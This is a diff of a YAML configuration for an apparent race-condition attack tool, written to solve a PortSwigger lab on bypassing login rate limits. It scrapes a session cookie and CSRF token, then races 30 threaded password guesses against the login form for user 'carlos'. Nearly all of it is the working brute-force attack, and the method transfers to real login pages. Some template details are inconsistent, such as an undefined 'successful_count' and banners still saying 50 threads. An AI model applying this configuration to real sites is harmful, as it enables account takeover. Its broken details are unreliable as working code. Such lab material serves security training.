@@ -41,51 +41,79 @@ target:
     port: 8080
 
 entrypoint:
-  state: brute_force_login
+  state: login_page
   input:
     username: "carlos"
-    passwords:
+    password:
       source: file
-      path: "builtin:passwords-top-100"
+      path: "builtin:passwords-top-30"
 
 # ============================================================================
 # STATES
 # ============================================================================
 
 states:
+
+  login_page:
+    description: "Fetch CSRF token from login page"
+    
+    request: |
+      GET /login HTTP/1.1
+      Host: {{ target.host }}
+    
+    extract:
+      session:
+        type: cookie
+        pattern: session
+      csrf_token:
+        type: xpath
+        pattern: "//input[@name='csrf']/@value"
+    
+    logger:
+      on_state_enter: |
+        🔐 Fetching session and CSRF token from login page...
+      on_state_leave: |
+        🔑 CSRF: {{ login_page.csrf }}
+        🍪 Session: {{ login_page.session }}
+
+    next:
+      - when:
+          - status: 200
+        goto: brute_force_login
+
+
   brute_force_login:
     description: "Bypass rate limit by racing login attempts with different passwords"
     
     # This state demonstrates the key feature: input_mode: distribute
     # Each of the 50 threads will receive a DIFFERENT password from the wordlist
     race:
-      threads: 50
+      threads: 30
       input_mode: distribute  # Each thread gets a unique password
       sync_mechanism: barrier
-      connection_strategy: preconnect
+      connection_strategy: multiplexed
       thread_propagation: single
+
+    # options:
+    #   proxy_bypass: true
     
     request: |
       POST /login HTTP/1.1
       Host: {{ target.host }}
+      Cookie: session={{ login_page.session }}
       Content-Type: application/x-www-form-urlencoded
       
-      username={{ username }}&password={{ input.password }}
-    
-    extract:
-      session:
-        type: cookie
-        pattern: session
+      csrf={{ login_page.csrf_token }}&username={{ thread.input.username }}&password={{ thread.input.password }}
     
     logger:
       on_state_enter: |
         ╔══════════════════════════════════════════════════════════════════════════════╗
-        ║  🔐 PortSwigger Lab 2: Bypassing Rate Limits via Race Conditions            ║
+        ║  🔐 PortSwigger Lab 2: Bypassing Rate Limits via Race Conditions             ║
         ╠══════════════════════════════════════════════════════════════════════════════╣
-        ║  Target:   {{ "%-67s" | format(target.host)                               }} ║
-        ║  Username: {{ "%-67s" | format(username)                                  }} ║
-        ║  Strategy: Race 50 login attempts with different passwords simultaneously  ║
-        ║  Mode:     DISTRIBUTE (each thread gets unique password)                   ║
+        ║  Target:   {{ "%-65s" | format(target.host)                               }} ║
+        ║  Username: {{ "%-65s" | format(username)                                  }} ║
+        ║  Strategy: Race 50 login attempts with different passwords simultaneously    ║
+        ║  Mode:     DISTRIBUTE (each thread gets unique password)                     ║
         ╚══════════════════════════════════════════════════════════════════════════════╝
         
         🔍 Loading passwords from built-in wordlist...
@@ -96,37 +124,31 @@ states:
         🟢 Thread {{ "%02d" | format(thread.id) }}: SUCCESS! Password found: "{{ input.password }}"
         {% elif response.status_code == 200 and 'Invalid username or password' in response.text %}
         🔴 Thread {{ "%02d" | format(thread.id) }}: Failed with "{{ input.password }}"
-        {% elif response.status_code == 429 %}
+        {% elif response.status_code == 200 and 'too many incorrect login attempts' in response.text %}
         ⚠️  Thread {{ "%02d" | format(thread.id) }}: Rate limited ({{ input.password }})
         {% else %}
         ⚪ Thread {{ "%02d" | format(thread.id) }}: Status {{ response.status_code }} ({{ input.password }})
         {% endif %}
       
       on_state_leave: |
-        
+        {% set successful = brute_force_login | selectattr('status', 'equalto', 302) | list %}
         ╔══════════════════════════════════════════════════════════════════════════════╗
         ║  📊 RACE ATTACK RESULTS                                                      ║
         ╠══════════════════════════════════════════════════════════════════════════════╣
-        ║  Threads:    {{ race.threads }}                                              ║
-        ║  Successful: {{ brute_force_login | selectattr('status', 'equalto', 302) | list | length }}                                                             ║
+        ║  Threads:    {{ "%-63s" | format(race.threads)                            }} ║
+        ║  Successful: {{ "%-63s" | format(successful_count | length)               }} ║
         ╚══════════════════════════════════════════════════════════════════════════════╝
         
-        {% set successful = brute_force_login | selectattr('status', 'equalto', 302) | list %}
         {% if successful | length > 0 %}
-        
         ╔══════════════════════════════════════════════════════════════════════════════╗
         ║  🎉 LAB SOLVED!                                                              ║
         ╠══════════════════════════════════════════════════════════════════════════════╣
         ║  ✅ Successfully bypassed rate limit and found valid credentials             ║
-        ║  👤 Username: {{ username }}                                                 ║
-        ║  🔑 Password: {{ successful[0].extracted.get('password', 'N/A') }}           ║
-        ║  🍪 Session:  {{ successful[0].session[:20] }}...                            ║
         ╚══════════════════════════════════════════════════════════════════════════════╝
         
         {% else %}
-        
         ╔══════════════════════════════════════════════════════════════════════════════╗
-        ║  ⚠️  NO SUCCESSFUL LOGIN                                                     ║
+        ║  ⚠️  NO SUCCESSFUL LOGIN                                                      ║
         ╠══════════════════════════════════════════════════════════════════════════════╣
         ║  Try:                                                                        ║
         ║  - Using a different wordlist                                                ║
